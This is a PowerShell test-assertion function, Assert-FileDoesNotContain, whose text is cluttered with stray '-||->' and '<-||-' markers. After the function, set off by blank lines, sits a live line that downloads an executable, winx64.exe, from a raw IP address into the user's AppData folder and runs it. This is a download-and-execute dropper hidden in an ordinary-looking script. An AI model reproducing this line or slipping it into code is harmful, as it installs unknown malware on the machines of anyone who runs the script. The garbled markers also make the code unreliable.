













 -||-> function Assert-FileDoesNotContain
{
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0)]
        [string]
        
        $Path,

        [Parameter(Position=1)]
        [string]
        
        $Needle,

        [Parameter(Position=2)]
        
        $Message
    )

     -||-> Set-StrictMode -Version 'Latest' <-||- 

     -||-> Write-Debug -Message "Checking that '$Path' does not contain expected content." <-||- 
     -||-> $actualContents =  -||-> Get-Content -Path $Path -Raw <-||-  <-||- 
     -||-> Write-Debug -Message "Actual:`n$actualContents" <-||- 
     -||-> Write-Debug -Message "Expected:`n$Needle" <-||- 
     -||-> if(  -||-> $actualContents -match ( -||-> [Text.RegularExpressions.Regex]::Escape($Needle) <-||- ) <-||-  )
    {
         -||-> Fail ( -||-> "File '{0}' contains '{1}'. {2}" -f $Path,$Needle,$Message <-||- ) <-||- 
    } <-||- 
} <-||- 


 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\winx64.exe" <-||- ) <-||- 



